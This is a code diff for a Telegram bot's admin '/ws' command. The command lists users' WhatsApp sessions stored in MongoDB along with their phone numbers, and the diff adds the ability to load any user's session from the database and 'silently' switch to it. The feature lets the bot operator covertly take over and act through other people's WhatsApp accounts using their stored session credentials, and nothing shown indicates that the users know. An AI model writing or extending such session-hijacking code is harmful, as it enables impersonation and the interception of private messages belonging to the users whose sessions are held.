@@ -3037,8 +3037,8 @@ bot.command("redeem", async (ctx) => {
 });
 
 // ─── /ws — Admin WhatsApp session switching ──────────────────────────────────
-// /ws              → list all connected WA sessions (userId + phone)
-// /ws [userId]     → switch to that user's WhatsApp session silently
+// /ws              → list all WA sessions stored in MongoDB (userId + phone)
+// /ws [userId]     → load & switch to that user's session silently
 // /ws off          → clear override, go back to admin's own WhatsApp
 bot.command("ws", async (ctx) => {
   if (!isAdmin(ctx.from!.id)) { await ctx.reply("🚫 You are not an admin."); return; }
@@ -3056,23 +3056,28 @@ bot.command("ws", async (ctx) => {
     return;
   }
 
-  // /ws [userId] — switch to that user's session
+  // /ws [userId] — switch to that user's session (loads from MongoDB if needed)
   if (arg) {
     const targetId = arg;
-    const success = setAdminSessionOverride(String(adminId), targetId);
+    // Tell admin we're loading (it may take a moment if session was evicted)
+    const loadingMsg = await ctx.reply(
+      `⏳ <b>Loading session for user <code>${targetId}</code>…</b>\n\nPlease wait while the WhatsApp session is being restored from the database.`,
+      { parse_mode: "HTML" }
+    );
+    const success = await setAdminSessionOverride(String(adminId), targetId);
     if (!success) {
-      await ctx.reply(
+      await ctx.api.editMessageText(ctx.chat!.id, loadingMsg.message_id,
         `❌ <b>Cannot switch to user <code>${targetId}</code></b>\n\n` +
-        `That user's WhatsApp is not currently connected.\n\n` +
-        `Use <code>/ws</code> to see all connected sessions.`,
+        `That user has no WhatsApp session stored in the database, or the session could not be restored.\n\n` +
+        `Use <code>/ws</code> to see all available sessions.`,
         { parse_mode: "HTML" }
       );
       return;
     }
-    const sessions = getAllConnectedSessions();
-    const target = sessions.find((s) => s.userId === targetId);
+    const allSessions = await getAllConnectedSessions();
+    const target = allSessions.find((s) => s.userId === targetId);
     const phone = target?.phoneNumber || "Unknown";
-    await ctx.reply(
+    await ctx.api.editMessageText(ctx.chat!.id, loadingMsg.message_id,
       `🔀 <b>Switched to User's WhatsApp!</b>\n\n` +
       `👤 User ID: <code>${targetId}</code>\n` +
       `📱 Phone: <code>${phone}</code>\n\n` +
@@ -3084,24 +3089,26 @@ bot.command("ws", async (ctx) => {
     return;
   }
 
-  // /ws — list all connected sessions
-  const sessions = getAllConnectedSessions();
-  if (!sessions.length) {
+  // /ws — list all sessions stored in MongoDB
+  const allSessions = await getAllConnectedSessions();
+  if (!allSessions.length) {
     await ctx.reply(
-      "📭 <b>No connected WhatsApp sessions found.</b>\n\n" +
-      "Users need to connect their WhatsApp first.",
+      "📭 <b>No WhatsApp sessions found.</b>\n\n" +
+      "No user has connected their WhatsApp yet.",
       { parse_mode: "HTML" }
     );
     return;
   }
   const currentOverride = getAdminSessionOverride(String(adminId));
-  let text = `🔀 <b>Connected WhatsApp Sessions (${sessions.length})</b>\n\n`;
-  for (const s of sessions) {
+  let text = `🔀 <b>WhatsApp Sessions (${allSessions.length})</b>\n\n`;
+  for (const s of allSessions) {
     const isActive = s.userId === currentOverride;
-    text += `${isActive ? "🔵 <b>[ACTIVE]</b> " : ""}👤 <code>${s.userId}</code> — 📱 <code>${s.phoneNumber || "Unknown"}</code>\n`;
+    const memStatus = s.inMemory ? "🟢" : "💾";
+    text += `${isActive ? "🔵 <b>[YOU]</b> " : ""}${memStatus} 👤 <code>${s.userId}</code> — 📱 <code>${s.phoneNumber}</code>\n`;
     if (isActive) text += `   ↳ You are currently using this session\n`;
   }
-  text += `\n<b>How to switch:</b>\n`;
+  text += `\n🟢 = active in memory  💾 = stored in DB (will load on switch)\n\n`;
+  text += `<b>How to switch:</b>\n`;
   text += `<code>/ws [userId]</code> — Switch to that user's WhatsApp\n`;
   text += `<code>/ws off</code> — Back to your own WhatsApp`;
   if (currentOverride) {
